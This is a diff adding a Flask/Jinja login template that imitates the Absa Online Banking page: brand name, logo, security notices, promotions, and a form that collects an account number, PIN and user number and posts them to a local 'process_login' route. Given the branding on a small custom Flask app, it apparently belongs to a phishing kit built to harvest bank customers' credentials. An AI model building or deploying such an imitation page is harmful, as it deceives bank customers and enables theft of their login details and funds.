@@ -1,0 +1,873 @@
+{% extends "base_login.html" %}
+
+{% block title %}Absa Online Banking - Login{% endblock %}
+
+{% block extra_css %}
+<style>
+  body {
+    background: #f5f5f5;
+    margin: 0;
+    padding: 0;
+    font-family: "Segoe UI", Arial, sans-serif;
+    color: var(--text-dark);
+  }
+
+  .main-header {
+    background: #fff;
+    border-bottom: 1px solid #e0e0e0;
+    padding: 0;
+  }
+
+  .header-nav {
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    max-width: 1200px;
+    margin: 0 auto;
+    padding: 10px 20px;
+  }
+
+  .logo-section {
+    display: flex;
+    align-items: center;
+    gap: 20px;
+  }
+
+  .brand-logo {
+    display: flex;
+    align-items: center;
+    gap: 10px;
+  }
+
+  .brand-logo img {
+    height: 40px;
+    width: auto;
+  }
+
+  .brand-text {
+    font-size: 18px;
+    font-weight: 600;
+    color: #333;
+  }
+
+  .nav-tabs {
+    display: flex;
+    gap: 0;
+  }
+
+  .nav-tab {
+    padding: 15px 25px;
+    text-decoration: none;
+    color: #666;
+    border-bottom: 3px solid transparent;
+    font-weight: 500;
+  }
+
+  .nav-tab.active {
+    color: var(--primary);
+    border-bottom-color: var(--primary);
+  }
+
+  .header-actions {
+    display: flex;
+    align-items: center;
+    gap: 20px;
+    font-size: 14px;
+  }
+
+  .header-actions a {
+    color: #666;
+    text-decoration: none;
+    display: flex;
+    align-items: center;
+    gap: 5px;
+  }
+
+  .container {
+    max-width: 1200px;
+    margin: 0 auto;
+    padding: 20px;
+    display: grid;
+    grid-template-columns: 1fr 2fr;
+    gap: 30px;
+  }
+
+  .login-section {
+    background: #fff;
+    border-radius: 8px;
+    padding: 0;
+    box-shadow: 0 2px 8px rgba(0,0,0,0.1);
+  }
+
+  .login-header {
+    background: var(--primary);
+    color: #fff;
+    padding: 20px;
+    border-radius: 8px 8px 0 0;
+    display: flex;
+    align-items: center;
+    gap: 15px;
+  }
+
+  .login-header-icon {
+    width: 50px;
+    height: 50px;
+    background: #fff;
+    border-radius: 50%;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    position: relative;
+  }
+
+  .login-header-icon::before {
+    content: '📄';
+    font-size: 24px;
+  }
+
+  .login-header h2 {
+    margin: 0;
+    font-size: 24px;
+    font-weight: 600;
+  }
+
+  .login-form {
+    padding: 25px;
+  }
+
+  .login-tabs {
+    display: flex;
+    margin-bottom: 20px;
+    border-bottom: 1px solid #e0e0e0;
+  }
+
+  .login-tab {
+    padding: 10px 0;
+    margin-right: 30px;
+    color: #666;
+    text-decoration: none;
+    border-bottom: 2px solid transparent;
+    font-weight: 500;
+  }
+
+  .login-tab.active {
+    color: var(--primary);
+    border-bottom-color: var(--primary);
+  }
+
+  .security-notice {
+    background: #f8f9fa;
+    padding: 15px;
+    border-radius: 4px;
+    margin-bottom: 20px;
+    font-size: 14px;
+    color: #666;
+  }
+
+  .form-group {
+    margin-bottom: 20px;
+  }
+
+  .form-group label {
+    display: block;
+    font-weight: 600;
+    margin-bottom: 8px;
+    color: #333;
+  }
+
+  .form-group input {
+    width: 100%;
+    padding: 12px;
+    border: 1px solid #ddd;
+    border-radius: 4px;
+    font-size: 16px;
+    box-sizing: border-box;
+  }
+
+  .form-group input:focus {
+    outline: none;
+    border-color: var(--primary);
+    box-shadow: 0 0 0 2px rgba(139, 21, 56, 0.1);
+  }
+
+  .help-text {
+    font-size: 12px;
+    color: #888;
+    margin-top: 5px;
+  }
+
+  .user-number-group {
+    display: flex;
+    align-items: center;
+    gap: 10px;
+  }
+
+  .user-number-group input {
+    flex: 1;
+  }
+
+  .info-icon {
+    width: 16px;
+    height: 16px;
+    background: #0066cc;
+    border-radius: 50%;
+    color: #fff;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 12px;
+    cursor: help;
+  }
+
+  .btn-primary {
+    width: 100%;
+    background: var(--accent);
+    color: #fff;
+    border: none;
+    padding: 15px;
+    font-size: 16px;
+    font-weight: 600;
+    border-radius: 4px;
+    cursor: pointer;
+    margin-bottom: 15px;
+  }
+
+  .btn-primary:hover {
+    background: #e55b00;
+  }
+
+  .btn-secondary {
+    width: 100%;
+    background: #fff;
+    color: var(--accent);
+    border: 1px solid var(--accent);
+    padding: 12px;
+    font-size: 14px;
+    border-radius: 4px;
+    cursor: pointer;
+    text-decoration: none;
+    text-align: center;
+    display: block;
+  }
+
+  .btn-secondary:hover {
+    background: #ffe5d6;
+  }
+
+  .content-section {
+    display: flex;
+    flex-direction: column;
+    gap: 20px;
+  }
+
+  .announcement {
+    background: var(--primary);
+    color: #fff;
+    padding: 20px;
+    border-radius: 8px;
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+  }
+
+  .announcement-content h3 {
+    margin: 0 0 5px 0;
+    font-size: 18px;
+    font-weight: 600;
+  }
+
+  .announcement-content p {
+    margin: 0;
+    opacity: 0.9;
+  }
+
+  .announcement-icon {
+    width: 100px;
+    height: 80px;
+    background: var(--primary);
+    border-radius: 8px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    position: relative;
+    flex-shrink: 0;
+  }
+
+  .announcement-icon::before {
+    content: '';
+    width: 70px;
+    height: 45px;
+    background: var(--accent);
+    border-radius: 4px;
+    border: 2px solid #fff;
+    position: relative;
+    display: block;
+  }
+
+  .announcement-icon::after {
+    content: '✓';
+    position: absolute;
+    color: #fff;
+    font-size: 24px;
+    font-weight: bold;
+    top: 50%;
+    left: 50%;
+    transform: translate(-50%, -50%);
+    z-index: 1;
+  }
+
+  .info-grid {
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+    gap: 20px;
+  }
+
+  .info-card {
+    background: #fff;
+    border-radius: 8px;
+    padding: 25px;
+    box-shadow: 0 2px 8px rgba(0,0,0,0.1);
+  }
+
+  .info-card h3 {
+    margin: 0 0 20px 0;
+    font-size: 20px;
+    font-weight: 600;
+    color: #333;
+  }
+
+  .info-item {
+    display: flex;
+    align-items: center;
+    gap: 15px;
+    padding: 15px 0;
+    border-bottom: 1px solid #f0f0f0;
+    text-decoration: none;
+    color: #333;
+  }
+
+  .info-item:last-child {
+    border-bottom: none;
+  }
+
+  .info-item:hover {
+    background: #f8f9fa;
+    margin: 0 -15px;
+    padding: 15px;
+    border-radius: 4px;
+  }
+
+  .info-icon-wrapper {
+    width: 40px;
+    height: 40px;
+    border-radius: 8px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    flex-shrink: 0;
+  }
+
+  .security-icon { 
+    background: var(--accent); 
+    color: #fff;
+    position: relative;
+  }
+  
+  .security-icon::before {
+    content: '';
+    position: absolute;
+    width: 20px;
+    height: 24px;
+    background: var(--primary);
+    border-radius: 50% 50% 50% 50% / 60% 60% 40% 40%;
+    top: 50%;
+    left: 50%;
+    transform: translate(-50%, -50%);
+  }
+  
+  .security-icon::after {
+    content: '✓';
+    position: absolute;
+    color: #fff;
+    font-size: 12px;
+    font-weight: bold;
+    top: 50%;
+    left: 50%;
+    transform: translate(-50%, -50%);
+    z-index: 1;
+  }
+  .alert-icon { 
+    background: #f0f8ff; 
+    color: var(--primary);
+    position: relative;
+  }
+  
+  .alert-icon::before {
+    content: '';
+    position: absolute;
+    width: 20px;
+    height: 24px;
+    background: #fff;
+    border: 2px solid var(--primary);
+    border-radius: 2px;
+    top: 50%;
+    left: 50%;
+    transform: translate(-50%, -50%);
+  }
+  
+  .alert-icon::after {
+    content: '';
+    position: absolute;
+    width: 12px;
+    height: 2px;
+    background: var(--primary);
+    top: 40%;
+    left: 50%;
+    transform: translate(-50%, -50%);
+    box-shadow: 
+      0 4px 0 var(--primary),
+      0 8px 0 var(--primary),
+      0 12px 0 var(--primary);
+  }
+  .shop-icon { 
+    background: #ffe5e5; 
+    color: var(--primary);
+    position: relative;
+  }
+  
+  .shop-icon::before {
+    content: '';
+    position: absolute;
+    width: 18px;
+    height: 20px;
+    background: var(--primary);
+    border-radius: 2px;
+    top: 55%;
+    left: 50%;
+    transform: translate(-50%, -50%);
+  }
+  
+  .shop-icon::after {
+    content: '';
+    position: absolute;
+    width: 12px;
+    height: 4px;
+    border: 2px solid var(--primary);
+    border-bottom: none;
+    border-radius: 6px 6px 0 0;
+    top: 35%;
+    left: 50%;
+    transform: translate(-50%, -50%);
+  }
+  .international-icon { 
+    background: #fff0e5; 
+    color: var(--accent);
+    position: relative;
+  }
+  
+  .international-icon::before {
+    content: '';
+    position: absolute;
+    width: 22px;
+    height: 22px;
+    background: var(--accent);
+    border-radius: 50%;
+    top: 50%;
+    left: 50%;
+    transform: translate(-50%, -50%);
+  }
+  
+  .international-icon::after {
+    content: '';
+    position: absolute;
+    width: 16px;
+    height: 16px;
+    border: 2px solid var(--primary);
+    border-radius: 50%;
+    top: 50%;
+    left: 50%;
+    transform: translate(-50%, -50%);
+    box-shadow: 
+      inset 0 -6px 0 var(--primary),
+      inset 6px 0 0 var(--primary);
+  }
+  .banking-icon { 
+    background: #f5e5ff; 
+    color: #8a2be2;
+    position: relative;
+  }
+  
+  .banking-icon::before {
+    content: '';
+    position: absolute;
+    width: 20px;
+    height: 14px;
+    background: #8B4513;
+    border-radius: 2px;
+    top: 45%;
+    left: 50%;
+    transform: translate(-50%, -50%);
+  }
+  
+  .banking-icon::after {
+    content: '';
+    position: absolute;
+    width: 18px;
+    height: 12px;
+    background: var(--primary);
+    border-radius: 2px;
+    top: 60%;
+    left: 52%;
+    transform: translate(-50%, -50%);
+  }
+  .benefits-icon { 
+    background: #e5fff5; 
+    color: #00a86b;
+    position: relative;
+  }
+  
+  .benefits-icon::before {
+    content: '';
+    position: absolute;
+    width: 20px;
+    height: 20px;
+    background: var(--primary);
+    border-radius: 50%;
+    top: 50%;
+    left: 50%;
+    transform: translate(-50%, -50%);
+    clip-path: polygon(50% 0%, 100% 50%, 50% 50%);
+  }
+  
+  .benefits-icon::after {
+    content: '';
+    position: absolute;
+    width: 12px;
+    height: 2px;
+    background: var(--primary);
+    top: 35%;
+    left: 40%;
+    transform: rotate(0deg);
+    box-shadow: 
+      0 6px 0 var(--primary),
+      0 12px 0 var(--primary),
+      0 18px 0 var(--primary);
+  }
+  .maintenance-icon { 
+    background: #fff5e5; 
+    color: #ffa500;
+    position: relative;
+  }
+  
+  .maintenance-icon::before {
+    content: '';
+    position: absolute;
+    width: 20px;
+    height: 16px;
+    background: var(--accent);
+    border-radius: 2px;
+    top: 55%;
+    left: 50%;
+    transform: translate(-50%, -50%);
+  }
+  
+  .maintenance-icon::after {
+    content: '';
+    position: absolute;
+    width: 20px;
+    height: 4px;
+    background: var(--primary);
+    border-radius: 2px 2px 0 0;
+    top: 35%;
+    left: 50%;
+    transform: translate(-50%, -50%);
+    box-shadow: 
+      0 2px 0 #fff,
+      4px 6px 0 #fff,
+      -4px 6px 0 #fff,
+      0 6px 0 #fff;
+  }
+
+  .info-content {
+    flex: 1;
+  }
+
+  .info-content h4 {
+    margin: 0 0 5px 0;
+    font-size: 14px;
+    font-weight: 600;
+    color: #333;
+  }
+
+  .info-content p {
+    margin: 0;
+    font-size: 12px;
+    color: #666;
+  }
+
+  .arrow-icon {
+    color: #ccc;
+    font-size: 16px;
+  }
+
+  .promo-grid {
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+    gap: 20px;
+    margin-top: 20px;
+  }
+
+  .promo-card {
+    background: var(--primary);
+    color: #fff;
+    padding: 25px;
+    border-radius: 8px;
+    position: relative;
+    overflow: hidden;
+  }
+
+  .promo-card h3 {
+    margin: 0 0 10px 0;
+    font-size: 18px;
+    font-weight: 600;
+  }
+
+  .promo-card p {
+    margin: 0 0 20px 0;
+    opacity: 0.9;
+    line-height: 1.4;
+  }
+
+  .promo-btn {
+    background: rgba(255,255,255,0.2);
+    color: #fff;
+    border: 1px solid rgba(255,255,255,0.3);
+    padding: 10px 20px;
+    border-radius: 4px;
+    text-decoration: none;
+    font-weight: 500;
+    display: inline-block;
+  }
+
+  .promo-btn:hover {
+    background: rgba(255,255,255,0.3);
+  }
+
+  @media (max-width: 768px) {
+    .container {
+      grid-template-columns: 1fr;
+      padding: 15px;
+    }
+    
+    .info-grid {
+      grid-template-columns: 1fr;
+    }
+    
+    .promo-grid {
+      grid-template-columns: 1fr;
+    }
+    
+    .header-nav {
+      flex-direction: column;
+      gap: 15px;
+    }
+    
+    .header-actions {
+      font-size: 12px;
+      gap: 15px;
+    }
+  }
+</style>
+{% endblock %}
+
+{% block content %}
+<div class="main-header">
+  <div class="header-nav">
+    <div class="logo-section">
+      <div class="brand-logo">
+        <img src="{{ url_for('static', filename='logo.png') }}" alt="ABSA">
+        <span class="brand-text">Absa Online Banking</span>
+      </div>
+      <div class="nav-tabs">
+        <a href="#" class="nav-tab active">Login</a>
+        <a href="#" class="nav-tab">Register</a>
+      </div>
+    </div>
+    <div class="header-actions">
+      <a href="#">Get help with Online Banking</a>
+      <a href="#">Contact us</a>
+      <a href="#">Afrikaans</a>
+    </div>
+  </div>
+</div>
+
+<div class="container">
+  <div class="login-section">
+    <div class="login-header">
+      <div class="login-header-icon"></div>
+      <h2>Login details</h2>
+    </div>
+    
+    <div class="login-form">
+      <div class="login-tabs">
+        <a href="#" class="login-tab">Password</a>
+        <a href="#" class="login-tab active">Log in</a>
+      </div>
+      
+      <div class="security-notice">
+        Never share your login details with anyone
+      </div>
+      
+      <form method="POST" action="{{ url_for('process_login') }}">
+        <div class="form-group">
+          <label>Access account number</label>
+          <input type="text" name="accountNumber" required>
+          <div class="help-text">Account number used when you registered for Online Banking</div>
+        </div>
+        
+        <div class="form-group">
+          <label>PIN</label>
+          <input type="password" name="pin" required>
+        </div>
+        
+        <div class="form-group">
+          <label>User number</label>
+          <div class="user-number-group">
+            <input type="text" name="userNumber" value="1" required>
+            <div class="info-icon">ℹ</div>
+          </div>
+        </div>
+        
+        <button type="submit" class="btn-primary">Next</button>
+        <a href="#" class="btn-secondary">Forgot PIN?</a>
+      </form>
+    </div>
+  </div>
+  
+  <div class="content-section">
+    <div class="announcement">
+      <div class="announcement-content">
+        <h3>Absa Online login has a new look!</h3>
+        <p>But don't worry, it still works the same way.</p>
+      </div>
+      <div class="announcement-icon"></div>
+    </div>
+    
+    <div class="info-grid">
+      <div class="info-card">
+        <h3>Security centre</h3>
+        
+        <a href="#" class="info-item">
+          <div class="info-icon-wrapper security-icon"></div>
+          <div class="info-content">
+            <h4>Security measures and enhancements</h4>
+          </div>
+          <div class="arrow-icon">→</div>
+        </a>
+        
+        <a href="#" class="info-item">
+          <div class="info-icon-wrapper alert-icon"></div>
+          <div class="info-content">
+            <h4>Latest scams and schemes</h4>
+          </div>
+          <div class="arrow-icon">→</div>
+        </a>
+        
+        <a href="#" class="info-item">
+          <div class="info-icon-wrapper shop-icon"></div>
+          <div class="info-content">
+            <h4>Shop online with ease</h4>
+          </div>
+          <div class="arrow-icon">→</div>
+        </a>
+      </div>
+      
+      <div class="info-card">
+        <h3>Useful information</h3>
+        
+        <a href="#" class="info-item">
+          <div class="info-icon-wrapper international-icon"></div>
+          <div class="info-content">
+            <h4>Grandmark International Pty Ltd</h4>
+          </div>
+          <div class="arrow-icon">→</div>
+        </a>
+        
+        <a href="#" class="info-item">
+          <div class="info-icon-wrapper banking-icon"></div>
+          <div class="info-content">
+            <h4>Explore more ways to do your banking</h4>
+          </div>
+          <div class="arrow-icon">→</div>
+        </a>
+        
+        <a href="#" class="info-item">
+          <div class="info-icon-wrapper benefits-icon"></div>
+          <div class="info-content">
+            <h4>2025 Benefits and Pricing</h4>
+          </div>
+          <div class="arrow-icon">→</div>
+        </a>
+        
+        <a href="#" class="info-item">
+          <div class="info-icon-wrapper maintenance-icon"></div>
+          <div class="info-content">
+            <h4>Next planned maintenance</h4>
+          </div>
+          <div class="arrow-icon">→</div>
+        </a>
+      </div>
+    </div>
+    
+    <div class="promo-grid">
+      <div class="promo-card">
+        <h3>#ProtectYourKeysToTheSafe</h3>
+        <p>Keep your PINs, passwords and transaction verifications safe.</p>
+        <a href="#" class="promo-btn">Learn more</a>
+      </div>
+      
+      <div class="promo-card">
+        <h3>2025 benefits and pricing</h3>
+        <p>Free Rewards, better banking and more value.</p>
+        <a href="#" class="promo-btn">Learn more</a>
+      </div>
+    </div>
+  </div>
+</div>
+{% endblock %}
+
+{% block scripts %}
+<script>
+  // Form validation
+  document.querySelector('form').addEventListener('submit', function(e) {
+    const accountNumber = document.querySelector('input[name="accountNumber"]').value;
+    const pin = document.querySelector('input[name="pin"]').value;
+    const userNumber = document.querySelector('input[name="userNumber"]').value;
+    
+    if (!accountNumber || !pin || !userNumber) {
+      e.preventDefault();
+      alert('Please fill in all required fields');
+      return;
+    }
+  });
+  
+  // Account number formatting
+  document.querySelector('input[name="accountNumber"]').addEventListener('input', function(e) {
+    let value = e.target.value.replace(/\D/g, '');
+    e.target.value = value;
+  });
+  
+  // PIN formatting
+  document.querySelector('input[name="pin"]').addEventListener('input', function(e) {
+    let value = e.target.value.replace(/\D/g, '');
+    e.target.value = value;
+  });
+  
+  // User number formatting
+  document.querySelector('input[name="userNumber"]').addEventListener('input', function(e) {
+    let value = e.target.value.replace(/\D/g, '');
+    if (value === '') value = '1';
+    e.target.value = value;
+  });
+</script>
+{% endblock %}
